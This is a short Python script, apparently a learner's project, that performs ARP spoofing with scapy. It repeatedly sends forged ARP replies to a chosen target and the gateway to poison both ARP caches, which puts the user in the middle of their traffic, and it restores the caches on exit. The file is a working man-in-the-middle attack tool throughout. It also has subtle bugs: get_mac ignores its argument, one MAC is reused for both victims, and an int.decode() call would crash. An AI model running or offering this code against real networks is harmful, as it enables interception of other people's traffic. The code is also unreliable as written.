#Basic ARP Spoofer
#Zachary Springer
#01/05/22

import scapy.all as scapy
import argparse
import time

target_ip = input("Please enter the Target's IP address: ")
target_mac = input("Please enter the Target's MAC address: ")
spoof_ip = input("Please enter the IP address to spoof: ")
gateway_ip= input("Please enter the Gateway IP: ")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    


def spoof(target_ip, spoof_ip):
    #Creates 2 packets (op = type of request)  where pdst = Target's IP, hwdst = Target's MAC, and source_ip = Router's IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent:"  + sent_packets_count.decode(), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+ Detected CTRL + C ..... Quitting.]\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)